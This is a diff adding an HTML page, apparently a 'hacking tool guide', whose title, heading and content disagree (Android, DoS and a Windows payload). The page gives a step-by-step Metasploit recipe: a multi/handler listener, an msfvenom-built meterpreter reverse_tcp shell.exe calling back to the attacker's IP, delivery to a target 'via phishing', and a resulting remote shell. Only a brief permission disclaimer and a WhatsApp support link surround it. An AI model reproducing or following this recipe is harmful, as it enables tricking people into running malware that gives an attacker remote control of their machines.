@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Android hacking tool Guide</title>
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Exo+2:wght@300;400;600&display=swap" rel="stylesheet">
+
+<style>
+*{margin:0;padding:0;box-sizing:border-box;}
+
+:root{
+--primary:#0a1128;
+--secondary:#1a1f35;
+--accent:#00d9ff;
+--accent2:#ff2a6d;
+--light:#e0f7fa;
+--dark:#051129;
+--danger:#ff1744;
+--phish:#9c27b0;
+}
+
+body{
+background:linear-gradient(135deg,var(--dark),var(--primary));
+color:var(--light);
+font-family:'Exo 2',sans-serif;
+line-height:1.6;
+min-height:100vh;
+display:flex;
+flex-direction:column;
+align-items:center;
+justify-content:center;
+overflow-x:hidden;
+padding:20px;
+}
+p{font-size:20px;color:orange;}
+.container{
+max-width:800px;
+width:100%;
+margin:0 auto;
+padding:20px;
+}
+
+header{
+text-align:center;
+padding:30px 0;
+margin-bottom:30px;
+}
+
+h1{
+font-family:'Orbitron',sans-serif;
+font-size:3rem;
+background:linear-gradient(to right,var(--accent),var(--phish));
+-webkit-background-clip:text;
+-webkit-text-fill-color:transparent;
+margin:15px 0;
+}
+
+.subtitle{
+font-size:1.2rem;
+color:var(--accent);
+margin-bottom:30px;
+}
+
+.warning{
+background:linear-gradient(45deg,#b71c1c,var(--danger));
+padding:20px;
+border-radius:10px;
+margin:20px auto;
+box-shadow:0 5px 25px rgba(255,23,68,0.3);
+text-align:center;
+}
+
+.warning h2{
+font-family:'Orbitron',sans-serif;
+margin-bottom:10px;
+}
+
+.installation{
+background:rgba(10,25,47,0.7);
+border-radius:15px;
+padding:30px;
+margin:30px 0;
+border:1px solid rgba(156,39,176,0.5);
+min-height:200px;
+}
+
+.support-btn{
+background:linear-gradient(45deg,#25d366,#128c7e);
+color:white;
+border:none;
+border-radius:50px;
+padding:18px 35px;
+font-size:1.2rem;
+font-weight:600;
+display:flex;
+align-items:center;
+gap:15px;
+cursor:pointer;
+margin-top:20px;
+}
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+<header>
+<h1>Dos/ddos tools guide</h1>
+<div class="subtitle">Open-Source Android  hack Simulations</div>
+
+<div class="warning">
+<h2><i class="fas fa-exclamation-triangle"></i> ETHICAL USE WARNING</h2>
+<p>
+Metasploit tool is designed for legitimate security awareness training.
+Use only on systems you own or have explicit permission to test.
+Unauthorized testing  are illegal and unethical.
+</p>
+</div>
+</header>
+
+<!-- EMPTY SECTION (PASTE YOUR CONTENT HERE) -->
+<section class="installation">
+  
+<p>
+ <br></br>
+ Metasploit installation Procedure.
+ <br></br>
+1. sudo apt update
+ <br></br>
+sudo apt upgrade -y
+ <br></br>
+sudo apt-get install metasploit-framework
+ <br></br>
+2. Start Metasploit
+ <br></br>
+msfconsole
+
+ <br></br>
+3. Setup Handler (Listener)
+ <br></br>
+- use exploit/multi/handler
+ <br></br>
+- set PAYLOAD windows/meterpreter/reverse_tcp
+- set LHOST (your IP address)(Attacker IP)
+- set LPORT (set port) (Listener port, e.g., 4444)
+- exploit -j (Start listener)
+ <br></br>
+4. Generate Payload (on attacker)
+ <br></br>
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=(your IP address) LPORT=(port set) -f exe > shell.exe
+""
+- shell.exe: Payload for Windows target.
+ <br></br>
+5. Deliver & Execute Payload
+- Send shell.exe to target (via phishing, etc.).
+- Get target to run shell.exe.
+ <br></br>
+6. Get Shell
+- When target runs payload, you'll get a Meterpreter shell on msfconsole.
+ <br></br>
+⚠️ Legal: Get explicit permission to test.
+</p>
+
+
+  
+  
+ </section>
+
+<button class="support-btn" onclick="window.open('https://wa.me/+254798688920','_blank')">
+<i class="fab fa-whatsapp"></i>
+Get Support on WhatsApp
+</button>
+
+</div>
+
+</body>
+</html>
+
